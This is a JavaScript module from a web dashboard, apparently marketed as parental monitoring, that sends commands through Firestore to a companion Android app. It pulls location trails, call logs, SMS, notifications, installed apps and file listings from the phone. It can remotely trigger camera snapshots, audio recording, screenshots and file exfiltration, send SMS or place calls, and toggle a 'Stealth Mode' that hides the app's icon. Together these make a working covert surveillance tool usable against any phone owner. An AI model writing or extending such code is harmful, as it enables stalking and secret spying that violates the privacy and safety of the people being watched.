import {
  collection,
  doc,
  onSnapshot,
  setDoc,
  addDoc,
  updateDoc,
  deleteDoc,
  getDocs,
  query,
  where,
  orderBy,
  limit,
  serverTimestamp
} from 'firebase/firestore';
import { db, isFirebaseConfigured } from '../firebase/config';
import { dataUriToBlob, triggerBrowserBlobDownload, downloadFileSafely, downloadFromRemoteUrl } from '../utils/fileDownloader';

/**
 * Helper to determine if an Android device currently has an active connection.
 * Android foreground service sends a heartbeat to Firestore every 15 seconds.
 * 
 * A device is considered CONNECTED if:
 * 1. isOnline !== false
 * 2. monitoringActive !== false
 * 3. connectionStatus is not 'CLOSED' or 'DISCONNECTED'
 * 4. lastSeen / lastUpdated timestamp was refreshed within maxHeartbeatAgeSeconds (default 35s).
 */
export function isDeviceConnected(device, maxHeartbeatAgeSeconds = 35) {
  if (!device) return false;

  // Explicit offline flags
  if (device.isOnline === false) return false;
  if (device.monitoringActive === false) return false;
  if (device.connectionStatus === 'CLOSED' || device.connectionStatus === 'DISCONNECTED') return false;

  // Timestamp inspection
  const rawTimestamp = device.lastSeen || device.lastUpdated;
  if (!rawTimestamp) return false;

  let timestampMs = null;
  if (typeof rawTimestamp.toMillis === 'function') {
    timestampMs = rawTimestamp.toMillis();
  } else if (typeof rawTimestamp.toDate === 'function') {
    timestampMs = rawTimestamp.toDate().getTime();
  } else if (rawTimestamp instanceof Date) {
    timestampMs = rawTimestamp.getTime();
  } else if (typeof rawTimestamp === 'number') {
    timestampMs = rawTimestamp;
  } else if (rawTimestamp && typeof rawTimestamp === 'object' && 'seconds' in rawTimestamp) {
    timestampMs = rawTimestamp.seconds * 1000 + (rawTimestamp.nanoseconds ? Math.round(rawTimestamp.nanoseconds / 1000000) : 0);
  } else if (typeof rawTimestamp === 'string') {
    const parsed = new Date(rawTimestamp).getTime();
    if (!isNaN(parsed)) timestampMs = parsed;
  }

  if (!timestampMs || isNaN(timestampMs) || timestampMs <= 0) return false;

  const now = Date.now();
  const ageSeconds = (now - timestampMs) / 1000;

  // Active if timestamp is within maxHeartbeatAgeSeconds (tolerant to -60s clock skew)
  return ageSeconds >= -60 && ageSeconds <= maxHeartbeatAgeSeconds;
}

/**
 * Subscribe to devices. By default, returns ONLY actively connected devices.
 * As soon as an Android device connects, it appears in the list.
 * As soon as the connection closes (or heartbeat stops), it disappears.
 */
export function subscribeToDevices(callback, onError, options = {}) {
  const { onlyConnected = true, maxAgeSeconds = 35 } = options;

  if (!isFirebaseConfigured()) {
    callback([]);
    return () => {};
  }

  try {
    const devicesCol = collection(db, 'devices');
    let latestRawDevices = [];

    const publishFilteredDevices = () => {
      const activeDevices = onlyConnected
        ? latestRawDevices.filter(d => isDeviceConnected(d, maxAgeSeconds))
        : latestRawDevices;
      callback(activeDevices);
    };

    const unsubscribe = onSnapshot(
      devicesCol,
      (snapshot) => {
        latestRawDevices = snapshot.docs.map((d) => ({
          id: d.id,
          deviceId: d.id,
          ...d.data()
        }));
        publishFilteredDevices();
      },
      (err) => {
        console.warn('Firestore devices listener error:', err);
        if (onError) onError(err);
      }
    );

    // Live heartbeat timer: checks every 2.5s so disconnected/killed devices
    // disappear automatically even when no new Firestore write occurs.
    const ticker = setInterval(() => {
      publishFilteredDevices();
    }, 2500);

    return () => {
      unsubscribe();
      clearInterval(ticker);
    };
  } catch (err) {
    console.error('Failed to setup devices listener:', err);
    if (onError) onError(err);
    return () => {};
  }
}

/**
 * Subscribe to real-time location breadcrumbs for a specific device.
 */
export function subscribeToDeviceLocations(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    // Generate realistic demo trail around a location
    const baseLat = 37.7749;
    const baseLng = -122.4194;
    const demoLocations = [
      { id: '1', latitude: baseLat, longitude: baseLng, accuracy: 8.5, speed: 2.1, altitude: 32, batteryLevel: 88, timestamp: new Date() },
      { id: '2', latitude: baseLat + 0.0012, longitude: baseLng + 0.0018, accuracy: 6.2, speed: 3.4, altitude: 34, batteryLevel: 87, timestamp: new Date(Date.now() - 30000) },
      { id: '3', latitude: baseLat + 0.0025, longitude: baseLng + 0.0031, accuracy: 5.0, speed: 4.8, altitude: 35, batteryLevel: 86, timestamp: new Date(Date.now() - 60000) },
      { id: '4', latitude: baseLat + 0.0038, longitude: baseLng + 0.0049, accuracy: 4.8, speed: 5.1, altitude: 38, batteryLevel: 85, timestamp: new Date(Date.now() - 90000) }
    ];
    callback(demoLocations);
    return () => {};
  }

  try {
    const locQuery = query(
      collection(db, 'devices', deviceId, 'locations'),
      orderBy('timestamp', 'desc'),
      limit(50)
    );

    return onSnapshot(locQuery, (snapshot) => {
      const locations = snapshot.docs.map((d) => ({
        id: d.id,
        ...d.data()
      }));
      callback(locations);
    });
  } catch (err) {
    console.error('Error listening to locations:', err);
    return () => {};
  }
}

/**
 * Subscribe to device diagnostic logs.
 */
export function subscribeToDeviceLogs(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback([
      { id: 'l1', eventType: 'SERVICE_START', message: 'Foreground tracking service started', level: 'INFO', timestamp: new Date() },
      { id: 'l2', eventType: 'GPS_FIX', message: 'High accuracy fused location acquired', level: 'INFO', timestamp: new Date(Date.now() - 45000) },
      { id: 'l3', eventType: 'COMMAND_DISPATCH', message: 'Command TAKE_SNAPSHOT executed successfully', level: 'INFO', timestamp: new Date(Date.now() - 90000) }
    ]);
    return () => {};
  }

  try {
    const logsQuery = query(
      collection(db, 'devices', deviceId, 'logs'),
      orderBy('timestamp', 'desc'),
      limit(40)
    );

    return onSnapshot(logsQuery, (snapshot) => {
      const logs = snapshot.docs.map((d) => ({
        id: d.id,
        ...d.data()
      }));
      callback(logs);
    });
  } catch (err) {
    console.error('Error listening to logs:', err);
    return () => {};
  }
}

/**
 * Subscribe to media records (images and audio files).
 */
export function subscribeToDeviceMedia(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback([
      {
        id: 'm1',
        type: 'IMAGE',
        fileName: 'snap_1728532910.jpg',
        downloadUrl: 'https://images.unsplash.com/photo-1518770660439-4636190af475?w=800&auto=format&fit=crop',
        fileSize: 142080,
        storageProvider: 'FREE_INLINE',
        timestamp: new Date()
      },
      {
        id: 'm_screen_1',
        type: 'SCREENSHOT',
        fileName: 'screenshot_display_live.jpg',
        downloadUrl: 'https://images.unsplash.com/photo-1551650975-87deedd944c3?w=800&auto=format&fit=crop',
        fileSize: 184520,
        storageProvider: 'FREE_INLINE',
        timestamp: new Date(Date.now() - 45000)
      },
      {
        id: 'm2',
        type: 'AUDIO',
        fileName: 'audio_rec_1728532850.m4a',
        downloadUrl: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
        fileSize: 64200,
        durationSeconds: 10,
        storageProvider: 'FREE_INLINE',
        timestamp: new Date(Date.now() - 120000)
      }
    ]);
    return () => {};
  }

  try {
    const mediaQuery = query(
      collection(db, 'devices', deviceId, 'media'),
      orderBy('timestamp', 'desc'),
      limit(30)
    );

    return onSnapshot(mediaQuery, (snapshot) => {
      const media = snapshot.docs.map((d) => ({
        id: d.id,
        ...d.data()
      }));
      callback(media);
    });
  } catch (err) {
    console.error('Error listening to media:', err);
    return () => {};
  }
}

/**
 * Send a remote command to the Android Tracker.
 */
export async function sendCommand(deviceId, action, parameters = {}) {
  const payload = {
    deviceId,
    action,
    parameters,
    status: 'PENDING',
    createdAt: Date.now()
  };

  if (!isFirebaseConfigured()) {
    console.log('[Demo Mode] Command simulated:', payload);
    return { id: 'demo_cmd_' + Date.now(), ...payload };
  }

  const docRef = await addDoc(collection(db, 'commands'), payload);
  return { id: docRef.id, ...payload };
}

/**
 * Update device monitoring status directly.
 */
export async function updateDeviceMonitoring(deviceId, monitoringActive) {
  if (!isFirebaseConfigured()) return;
  const deviceDoc = doc(db, 'devices', deviceId);
  await setDoc(deviceDoc, {
    monitoringActive,
    isOnline: monitoringActive,
    connectionStatus: monitoringActive ? 'ACTIVE' : 'CLOSED',
    lastUpdated: serverTimestamp()
  }, { merge: true });
}

/**
 * Permanently delete a device and its associated subcollections from Firestore.
 */
export async function deleteDevice(deviceId) {
  if (!deviceId) return false;
  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    console.log('[Demo Mode] Device removed:', deviceId);
    return true;
  }
  try {
    const subcollections = [
      'locations',
      'logs',
      'media',
      'messages',
      'files',
      'calls',
      'sms',
      'installed_apps',
      'file_transfers'
    ];
    for (const sub of subcollections) {
      try {
        const snap = await getDocs(collection(db, 'devices', deviceId, sub));
        const batchDeletes = snap.docs.map((d) => deleteDoc(d.ref));
        await Promise.all(batchDeletes);
      } catch (subErr) {
        console.debug(`Notice clearing subcollection ${sub}:`, subErr);
      }
    }

    try {
      const cmdsSnap = await getDocs(query(collection(db, 'commands'), where('deviceId', '==', deviceId)));
      const cmdDeletes = cmdsSnap.docs.map((d) => deleteDoc(d.ref));
      await Promise.all(cmdDeletes);
    } catch (_) {}

    const devDoc = doc(db, 'devices', deviceId);
    await deleteDoc(devDoc);
    return true;
  } catch (err) {
    console.error('Failed to delete device:', err);
    throw err;
  }
}

/**
 * Subscribe to family chat messages between parent and child.
 */
export function subscribeToDeviceMessages(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback([
      { id: 'm1', sender: 'PARENT', text: 'Hi! Let us know when you reach soccer practice.', timestamp: Date.now() - 360000 },
      { id: 'm2', sender: 'CHILD', text: 'Reached safely! Battery is full.', timestamp: Date.now() - 180000 }
    ]);
    return () => {};
  }

  try {
    const msgQuery = query(
      collection(db, 'devices', deviceId, 'messages'),
      orderBy('timestamp', 'asc'),
      limit(50)
    );

    return onSnapshot(msgQuery, (snapshot) => {
      const messages = snapshot.docs.map((d) => ({
        id: d.id,
        ...d.data()
      }));
      callback(messages);
    });
  } catch (err) {
    console.error('Error listening to messages:', err);
    return () => {};
  }
}

/**
 * Send a family message from the Parent Dashboard to the child's phone.
 */
export async function sendFamilyMessage(deviceId, text) {
  const payload = {
    deviceId,
    sender: 'PARENT',
    text: text.trim(),
    timestamp: Date.now()
  };

  if (!isFirebaseConfigured()) {
    console.log('[Demo Mode] Parent message sent:', payload);
    return { id: 'demo_msg_' + Date.now(), ...payload };
  }

  // Save to messages subcollection
  const msgDoc = await addDoc(collection(db, 'devices', deviceId, 'messages'), payload);
  // Also dispatch a remote command to trigger high-priority notification on the phone
  await sendCommand(deviceId, 'SEND_MESSAGE', { text: text.trim() });
  return { id: msgDoc.id, ...payload };
}

/**
 * Clear the entire family chat history from both ends (Parent and Child).
 */
export async function clearFamilyChat(deviceId) {
  if (!deviceId) return false;

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    console.log('[Demo Mode] Family chat cleared for:', deviceId);
    return true;
  }

  try {
    const msgsCol = collection(db, 'devices', deviceId, 'messages');
    const snapshot = await getDocs(msgsCol);
    const deletePromises = snapshot.docs.map((d) => deleteDoc(d.ref));
    await Promise.all(deletePromises);
    // Notify phone companion if needed
    try {
      await sendCommand(deviceId, 'CLEAR_CHAT');
    } catch (_) {}
    return true;
  } catch (err) {
    console.error('Failed to clear family chat:', err);
    throw err;
  }
}

/**
 * Trigger loud ringtone alarm on child's phone for emergency check-in.
 */
export async function triggerPhoneRing(deviceId) {
  return await sendCommand(deviceId, 'RING_PHONE');
}

/**
 * Subscribe to storage configuration.
 */
export function subscribeToStorageConfig(callback) {
  const localDefault = {
    provider: 'INLINE',
    cloudinaryCloudName: '',
    cloudinaryUploadPreset: '',
    supabaseUrl: '',
    supabaseAnonKey: '',
    supabaseBucket: 'media'
  };

  const saved = localStorage.getItem('nexus_storage_config');
  let currentConfig = saved ? { ...localDefault, ...JSON.parse(saved) } : localDefault;
  callback(currentConfig);

  if (!isFirebaseConfigured()) {
    return () => {};
  }

  try {
    const docRef = doc(db, 'config', 'storage');
    return onSnapshot(docRef, (snap) => {
      if (snap.exists()) {
        const remoteConfig = { ...localDefault, ...snap.data() };
        localStorage.setItem('nexus_storage_config', JSON.stringify(remoteConfig));
        callback(remoteConfig);
      }
    });
  } catch (err) {
    console.warn('Error subscribing to storage config:', err);
    return () => {};
  }
}

/**
 * Save storage configuration (syncs to both Firestore and local cache).
 */
export async function saveStorageConfig(config) {
  localStorage.setItem('nexus_storage_config', JSON.stringify(config));

  if (!isFirebaseConfigured()) {
    return true;
  }

  try {
    const docRef = doc(db, 'config', 'storage');
    await setDoc(docRef, config, { merge: true });
    return true;
  } catch (err) {
    console.error('Failed to save storage config to Firestore:', err);
    return false;
  }
}

/**
 * Subscribe to the inventory of files scanned on the child device.
 */
export function subscribeToDeviceFiles(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback([
      { id: 'f1', name: 'family_photo_vacation.jpg', folder: 'Camera / DCIM', sizeFormatted: '2.4 MB', category: 'IMAGE', extension: 'jpg', path: '/storage/emulated/0/DCIM/family_photo_vacation.jpg', lastModified: Date.now() - 3600000 },
      { id: 'f2', name: 'school_homework.pdf', folder: 'Documents', sizeFormatted: '480 KB', category: 'DOCUMENT', extension: 'pdf', path: '/storage/emulated/0/Documents/school_homework.pdf', lastModified: Date.now() - 7200000 },
      { id: 'f3', name: 'study_notes.txt', folder: 'Downloads', sizeFormatted: '12 KB', category: 'DOCUMENT', extension: 'txt', path: '/storage/emulated/0/Download/study_notes.txt', lastModified: Date.now() - 14400000 },
      { id: 'f4', name: 'science_project_clip.mp4', folder: 'Camera / DCIM', sizeFormatted: '15.8 MB', category: 'VIDEO', extension: 'mp4', path: '/storage/emulated/0/DCIM/science_project_clip.mp4', lastModified: Date.now() - 48000000 },
      { id: 'f5', name: 'voice_memo.m4a', folder: 'Music', sizeFormatted: '1.2 MB', category: 'AUDIO', extension: 'm4a', path: '/storage/emulated/0/Music/voice_memo.m4a', lastModified: Date.now() - 86400000 },
      { id: 'f6', name: 'whatsapp_beta_installer.apk', folder: 'Downloads', sizeFormatted: '84.2 MB', category: 'ARCHIVE', extension: 'apk', path: '/storage/emulated/0/Download/whatsapp_beta_installer.apk', lastModified: Date.now() - 10800000 },
      { id: 'f7', name: 'project_photos_bundle.zip', folder: 'Documents', sizeFormatted: '38.6 MB', category: 'ARCHIVE', extension: 'zip', path: '/storage/emulated/0/Documents/project_photos_bundle.zip', lastModified: Date.now() - 21600000 },
      { id: 'f8', name: 'game_asset_cache.rar', folder: 'Downloads', sizeFormatted: '125.0 MB', category: 'ARCHIVE', extension: 'rar', path: '/storage/emulated/0/Download/game_asset_cache.rar', lastModified: Date.now() - 34000000 },
      { id: 'f9', name: 'device_backup.tar.gz', folder: 'Downloads', sizeFormatted: '62.4 MB', category: 'ARCHIVE', extension: 'gz', path: '/storage/emulated/0/Download/device_backup.tar.gz', lastModified: Date.now() - 45000000 },
      { id: 'f10', name: 'network_config.json', folder: 'Downloads', sizeFormatted: '8 KB', category: 'OTHER', extension: 'json', path: '/storage/emulated/0/Download/network_config.json', lastModified: Date.now() - 52000000 }
    ]);
    return () => {};
  }

  try {
    const docRef = doc(db, 'devices', deviceId, 'storage_catalog', 'inventory');
    return onSnapshot(docRef, (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        callback(data.files || []);
      } else {
        callback([]);
      }
    });
  } catch (err) {
    console.error('Error listening to storage catalog:', err);
    return () => {};
  }
}

/**
 * Trigger remote scan of storage files on the child device.
 */
export async function triggerStorageScan(deviceId) {
  return await sendCommand(deviceId, 'SCAN_STORAGE');
}

/**
 * Remotely place a direct phone call (ACTION_CALL) on the child companion device.
 */
export async function triggerDirectCall(deviceId, phoneNumber) {
  return await sendCommand(deviceId, 'CALL_PHONE', { phoneNumber, directCall: true });
}

/**
 * Remotely launch the phone dialer (ACTION_DIAL) on child device with prefilled number.
 */
export async function triggerRemoteDial(deviceId, phoneNumber, directCall = false) {
  return await sendCommand(deviceId, directCall ? 'CALL_PHONE' : 'DIAL_PHONE', { phoneNumber, directCall });
}

/**
 * Subscribe to recent call logs from child phone.
 */
export function subscribeToCallLogs(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback([
      { id: 'c1', number: '+919876543210', name: 'Mom', type: 'INCOMING', durationFormatted: '2m 14s', timestamp: Date.now() - 3600000 },
      { id: 'c2', number: '+919812345678', name: 'Dad', type: 'OUTGOING', durationFormatted: '1m 05s', timestamp: Date.now() - 7200000 },
      { id: 'c3', number: '+919899887766', name: 'Unknown', type: 'MISSED', durationFormatted: '0s', timestamp: Date.now() - 14400000 }
    ]);
    return () => {};
  }

  try {
    const docRef = doc(db, 'devices', deviceId, 'telephony', 'call_logs');
    return onSnapshot(docRef, (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        callback(data.callLogs || []);
      } else {
        callback([]);
      }
    });
  } catch (err) {
    console.error('Error listening to call logs:', err);
    return () => {};
  }
}

/**
 * Subscribe to recent SMS messages from child phone.
 */
export function subscribeToSmsLogs(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback([
      { id: 's1', address: '+919876543210', body: 'Are you on your way home?', type: 'INBOX', timestamp: Date.now() - 1800000 },
      { id: 's2', address: '+919876543210', body: 'Yes, just left school!', type: 'SENT', timestamp: Date.now() - 1500000 }
    ]);
    return () => {};
  }

  try {
    const docRef = doc(db, 'devices', deviceId, 'telephony', 'sms_logs');
    return onSnapshot(docRef, (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        callback(data.messages || []);
      } else {
        callback([]);
      }
    });
  } catch (err) {
    console.error('Error listening to SMS logs:', err);
    return () => {};
  }
}

/**
 * Subscribe to real-time notifications from the child device.
 * Includes calls, SMS, guardian messages, and system alerts.
 */
export function subscribeToNotifications(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback([
      { id: 'n1', type: 'CALL_INCOMING', title: 'Incoming Call', body: 'Call from Mom (+919876543210)', contactName: 'Mom', contactNumber: '+919876543210', priority: 'MAX', isRead: false, timestamp: new Date() },
      { id: 'n2', type: 'SMS_INCOMING', title: 'New SMS', body: 'Are you on your way home?', contactName: 'Mom', contactNumber: '+919876543210', priority: 'HIGH', isRead: false, timestamp: new Date(Date.now() - 1800000) },
      { id: 'n3', type: 'GUARDIAN_MESSAGE', title: 'Guardian Alert', body: 'Please confirm you reached safely', contactName: '', contactNumber: '', priority: 'MAX', isRead: true, timestamp: new Date(Date.now() - 3600000) },
      { id: 'n4', type: 'CALL_MISSED', title: 'Missed Call', body: 'Missed call from Dad (+919812345678)', contactName: 'Dad', contactNumber: '+919812345678', priority: 'HIGH', isRead: false, timestamp: new Date(Date.now() - 7200000) },
      { id: 'n5', type: 'SYSTEM_ALERT', title: 'Battery Low', body: 'Device battery is at 15%', contactName: '', contactNumber: '', priority: 'HIGH', isRead: true, timestamp: new Date(Date.now() - 14400000) }
    ]);
    return () => {};
  }

  try {
    const notifQuery = query(
      collection(db, 'devices', deviceId, 'notifications'),
      orderBy('timestamp', 'desc'),
      limit(50)
    );

    return onSnapshot(notifQuery, (snapshot) => {
      const notifications = snapshot.docs.map((d) => ({
        id: d.id,
        ...d.data()
      }));
      callback(notifications);
    });
  } catch (err) {
    console.error('Error listening to notifications:', err);
    return () => {};
  }
}

/**
 * Remotely request phone to sync latest Call Logs.
 */
export async function triggerSyncCallLogs(deviceId) {
  return await sendCommand(deviceId, 'SYNC_CALLS');
}

/**
 * Remotely request phone to sync latest SMS.
 */
export async function triggerSyncSms(deviceId) {
  return await sendCommand(deviceId, 'SYNC_SMS');
}

/**
 * Remotely send an SMS text message from child phone.
 */
export async function triggerSendSms(deviceId, phoneNumber, message) {
  return await sendCommand(deviceId, 'SEND_SMS', { phoneNumber, message });
}

/**
 * Delete a media item (snapshot image or voice recording) from Firestore.
 */
export async function deleteMediaRecord(deviceId, mediaId) {
  if (!deviceId || !mediaId) return false;
  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    console.log('[Demo Mode] Media deleted:', mediaId);
    return true;
  }
  try {
    const docRef = doc(db, 'devices', deviceId, 'media', mediaId);
    await deleteDoc(docRef);
    return true;
  } catch (err) {
    console.error('Failed to delete media record:', err);
    throw err;
  }
}

/**
 * Delete a notification from Firestore.
 */
export async function deleteNotification(deviceId, notificationId) {
  if (!deviceId || !notificationId) return false;
  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    console.log('[Demo Mode] Notification deleted:', notificationId);
    return true;
  }
  try {
    const docRef = doc(db, 'devices', deviceId, 'notifications', notificationId);
    await deleteDoc(docRef);
    return true;
  } catch (err) {
    console.error('Failed to delete notification:', err);
    throw err;
  }
}

/**
 * Mark notification as read in Firestore.
 */
export async function markNotificationRead(deviceId, notificationId) {
  if (!deviceId || !notificationId) return false;
  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    return true;
  }
  try {
    const docRef = doc(db, 'devices', deviceId, 'notifications', notificationId);
    await updateDoc(docRef, { isRead: true });
    return true;
  } catch (err) {
    console.error('Failed to mark notification read:', err);
    throw err;
  }
}

/**
 * Clear all notifications for a device.
 */
export async function clearAllNotifications(deviceId) {
  if (!deviceId) return false;
  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    console.log('[Demo Mode] All notifications cleared for:', deviceId);
    return true;
  }
  try {
    const notifCol = collection(db, 'devices', deviceId, 'notifications');
    const snapshot = await getDocs(notifCol);
    const deletePromises = snapshot.docs.map((d) => deleteDoc(d.ref));
    await Promise.all(deletePromises);
    return true;
  } catch (err) {
    console.error('Failed to clear notifications:', err);
    throw err;
  }
}

/**
 * Subscribe to the inventory of installed applications on the child phone.
 */
export function subscribeToInstalledApps(deviceId, callback) {
  if (!deviceId) return () => {};

  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    callback({
      totalCount: 38,
      userAppsCount: 6,
      lastSynced: Date.now() - 120000,
      apps: [
        { name: 'WhatsApp', packageName: 'com.whatsapp', versionName: '2.24.12.78', isSystemApp: false, installTime: Date.now() - 864000000 },
        { name: 'Instagram', packageName: 'com.instagram.android', versionName: '335.0.0.35', isSystemApp: false, installTime: Date.now() - 1728000000 },
        { name: 'YouTube', packageName: 'com.google.android.youtube', versionName: '19.23.35', isSystemApp: false, installTime: Date.now() - 2592000000 },
        { name: 'Chrome', packageName: 'com.android.chrome', versionName: '126.0.6478', isSystemApp: false, installTime: Date.now() - 3456000000 },
        { name: 'Spotify', packageName: 'com.spotify.music', versionName: '8.9.44.568', isSystemApp: false, installTime: Date.now() - 4320000000 },
        { name: 'Calculator', packageName: 'com.google.android.calculator', versionName: '8.6.1', isSystemApp: true, installTime: Date.now() - 5184000000 },
        { name: 'Google Maps', packageName: 'com.google.android.apps.maps', versionName: '11.134.0102', isSystemApp: true, installTime: Date.now() - 6048000000 },
        { name: 'Settings', packageName: 'com.android.settings', versionName: '15.0', isSystemApp: true, installTime: Date.now() - 6912000000 }
      ]
    });
    return () => {};
  }

  try {
    const docRef = doc(db, 'devices', deviceId, 'installed_apps', 'inventory');
    return onSnapshot(docRef, (snap) => {
      if (snap.exists()) {
        callback(snap.data());
      } else {
        callback({ totalCount: 0, userAppsCount: 0, apps: [] });
      }
    });
  } catch (err) {
    console.error('Error listening to installed apps:', err);
    return () => {};
  }
}

/**
 * Remotely request phone to scan and sync all installed applications.
 */
export async function triggerSyncInstalledApps(deviceId) {
  return await sendCommand(deviceId, 'SYNC_APPS');
}

/**
 * Remotely toggle device flashlight / torch.
 */
export async function triggerTorchToggle(deviceId, enabled = null) {
  return await sendCommand(deviceId, 'TOGGLE_TORCH', enabled !== null ? { enabled } : {});
}

/**
 * Remotely trigger full-screen Chat Overlay on the child phone.
 */
export async function triggerChatOverlay(deviceId) {
  return await sendCommand(deviceId, 'SHOW_CHAT_OVERLAY');
}

/**
 * Remotely trigger camera snapshot (front camera or back camera).
 */
export async function triggerCameraSnapshot(deviceId, useFrontCamera = false) {
  return await sendCommand(deviceId, 'TAKE_SNAPSHOT', { useFrontCamera });
}

/**
 * Remotely trigger audio recording.
 */
export async function triggerAudioRecording(deviceId, duration = 10) {
  return await sendCommand(deviceId, 'RECORD_AUDIO', { duration });
}

/**
 * Sync everything in one remote batch request.
 */
export async function triggerSyncEverything(deviceId) {
  await Promise.allSettled([
    sendCommand(deviceId, 'SYNC_CALLS'),
    sendCommand(deviceId, 'SYNC_SMS'),
    sendCommand(deviceId, 'SCAN_STORAGE'),
    sendCommand(deviceId, 'SYNC_APPS')
  ]);
  return true;
}

/**
 * Request child device to upload/deliver a specific file for download.
 */
export async function triggerFetchFile(deviceId, filePath, fileName, fileId) {
  return await sendCommand(deviceId, 'FETCH_FILE', { path: filePath, name: fileName, fileId });
}

/**
 * Trigger remote device screenshot capture.
 */
export async function triggerScreenshot(deviceId) {
  return await sendCommand(deviceId, 'CAPTURE_SCREENSHOT');
}

/**
 * Request child companion device to read and deliver a real file from storage.
 * Waits for the device to upload the real bytes, then downloads the genuine file in the browser.
 */
export async function fetchAndDownloadRealDeviceFile(deviceId, file, onStatusUpdate = () => {}) {
  const filename = file.name || 'device_file';

  // 1. If downloadUrl already exists (cached or cloud), download genuine bytes immediately!
  if (file.downloadUrl) {
    onStatusUpdate(`Downloading ${filename}...`);
    return await downloadFromRemoteUrl(file.downloadUrl, filename);
  }

  // 2. If running in Demo preview mode
  if (!isFirebaseConfigured() || deviceId === 'dev_preview_nexus') {
    onStatusUpdate(`[Demo Mode] Preparing uncorrupted download for ${filename}...`);
    await downloadFileSafely(file, deviceId);
    return { success: true, method: 'DEMO' };
  }

  // 3. Dispatch FETCH_FILE command to real companion phone
  onStatusUpdate(`Requesting real file from companion phone: ${filename} (${file.sizeFormatted || 'Full size'})...`);
  const cmd = await sendCommand(deviceId, 'FETCH_FILE', {
    path: file.path,
    name: file.name,
    fileId: file.id
  });

  // 4. Wait for phone to complete upload via file_transfers subcollection or command result
  return new Promise((resolve, reject) => {
    let resolved = false;

    // Timeout after 60 seconds (giving mobile networks plenty of time)
    const timeout = setTimeout(() => {
      if (!resolved) {
        resolved = true;
        cleanup();
        const errMessage = `Device response timed out for ${filename}. Ensure companion app is running and battery saver is disabled.`;
        onStatusUpdate(`⚠️ ${errMessage}`);
        reject(new Error(errMessage));
      }
    }, 60000);

    const cleanup = () => {
      clearTimeout(timeout);
      unsubTransfer();
      unsubCmd();
    };

    // Listener A: file_transfers document (delivers real binary bytes / downloadUrl)
    const transferDocRef = doc(db, 'devices', deviceId, 'file_transfers', cmd.id);
    const unsubTransfer = onSnapshot(transferDocRef, async (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        if (data.status === 'COMPLETED' && data.downloadUrl) {
          if (resolved) return;
          resolved = true;
          cleanup();
          const sizeLabel = data.fileSize ? (data.fileSize / 1024).toFixed(1) + ' KB' : file.sizeFormatted || 'Full Size';
          onStatusUpdate(`✅ Real device file received (${sizeLabel}). Downloading...`);

          try {
            const dlResult = await downloadFromRemoteUrl(data.downloadUrl, filename);
            onStatusUpdate(`🎉 Download complete: ${filename} (${sizeLabel})`);
            resolve({ success: true, method: 'DEVICE_FILE_TRANSFER', size: data.fileSize, ...dlResult });
          } catch (dlErr) {
            onStatusUpdate(`Download error: ${dlErr.message}`);
            reject(dlErr);
          }
        }
      }
    }, (err) => {
      console.warn('file_transfers listener warning:', err);
    });

    // Listener B: commands document status
    const cmdDocRef = doc(db, 'commands', cmd.id);
    const unsubCmd = onSnapshot(cmdDocRef, async (snap) => {
      if (snap.exists()) {
        const cData = snap.data();
        if (cData.status === 'EXECUTED' && cData.result && cData.result.startsWith('data:')) {
          if (resolved) return;
          resolved = true;
          cleanup();
          onStatusUpdate(`✅ Real file bytes received from phone. Downloading...`);
          const blob = dataUriToBlob(cData.result);
          triggerBrowserBlobDownload(blob, filename);
          onStatusUpdate(`🎉 Download complete: ${filename} (${(blob.size / 1024).toFixed(1)} KB)`);
          resolve({ success: true, method: 'COMMAND_RESULT', size: blob.size });
        } else if (cData.status === 'EXECUTED' && cData.result && (cData.result.startsWith('http://') || cData.result.startsWith('https://'))) {
          if (resolved) return;
          resolved = true;
          cleanup();
          onStatusUpdate(`✅ Real file URL received. Downloading...`);
          try {
            const dlResult = await downloadFromRemoteUrl(cData.result, filename);
            onStatusUpdate(`🎉 Download complete: ${filename}`);
            resolve({ success: true, method: 'COMMAND_URL', ...dlResult });
          } catch (dlErr) {
            onStatusUpdate(`Download error: ${dlErr.message}`);
            reject(dlErr);
          }
        } else if (cData.status === 'EXECUTED' && cData.result && cData.result.includes('Delivered real file')) {
          onStatusUpdate(`📡 Receiving file stream from phone...`);
        } else if (cData.status === 'FAILED') {
          if (resolved) return;
          resolved = true;
          cleanup();
          const errorMsg = cData.error || 'File inaccessible or permission denied on companion phone';
          onStatusUpdate(`❌ ${errorMsg}`);
          reject(new Error(errorMsg));
        }
      }
    }, (err) => {
      console.warn('commands listener warning:', err);
    });
  });
}

/**
 * Remotely toggle Stealth Mode (hide or unhide app launcher icon on companion phone).
 */
export async function triggerStealthToggle(deviceId) {
  return await sendCommand(deviceId, 'TOGGLE_STEALTH');
}

export async function triggerHideIcon(deviceId) {
  return await sendCommand(deviceId, 'HIDE_ICON');
}

export async function triggerShowIcon(deviceId) {
  return await sendCommand(deviceId, 'SHOW_ICON');
}


